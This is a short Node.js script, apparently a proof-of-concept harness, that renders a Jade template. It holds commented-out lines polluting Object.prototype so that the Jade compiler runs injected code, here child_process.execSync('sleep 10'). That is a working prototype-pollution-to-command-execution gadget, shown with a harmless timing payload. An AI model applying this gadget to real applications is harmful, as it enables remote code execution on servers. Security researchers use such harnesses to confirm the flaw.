var jade = require('jade');
const path = require('path');
const templatePath = path.join(__dirname+'/views/', 'index.jade');


// Object.prototype.compileDebug = 1;
// Object.prototype.self = 1;
// Object.prototype.line = "global.process.mainModule.require('child_process').execSync('sleep 10')"


jade.renderFile(templatePath);